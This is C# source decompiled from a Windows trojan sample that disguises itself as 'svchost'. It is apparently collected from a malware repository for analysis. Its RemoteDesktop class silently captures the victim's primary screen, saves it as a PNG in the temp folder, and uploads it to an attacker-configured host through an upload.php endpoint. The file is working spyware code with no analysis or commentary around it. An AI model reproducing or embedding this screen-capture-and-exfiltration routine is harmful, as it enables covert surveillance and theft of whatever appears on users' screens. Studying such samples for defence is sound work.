// Decompiled with JetBrains decompiler
// Type: svchost.Other.RemoteDesktop
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using svchost.My;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace svchost.Other
{
  [OptionText]
  public class RemoteDesktop
  {
    public string Host;
    public string ID;
    private Thread TH;

    public object Start()
    {
      object obj;
      try
      {
        this.TakeScreen(Path.Combine(Path.GetTempPath(), this.ID + ".png"));
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    private object Upload(string screenshot)
    {
      object obj;
      try
      {
        MyProject.Computer.Network.UploadFile(screenshot, this.Host + "/upload.php?id=" + this.ID);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object TakeScreen(string filename)
    {
      object screen;
      try
      {
        Size primaryMonitorSize = SystemInformation.PrimaryMonitorSize;
        Bitmap bitmap = new Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height);
        Graphics graphics = Graphics.FromImage((Image) bitmap);
        Point upperLeftSource = new Point(0, 0);
        Point upperLeftDestination = new Point(0, 0);
        graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize);
        graphics.Flush();
        bitmap.Save(filename, ImageFormat.Png);
        this.Upload(filename);
        screen = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        screen = (object) ex.Message;
        ProjectData.ClearProjectError();
      }
      return screen;
    }
  }
}
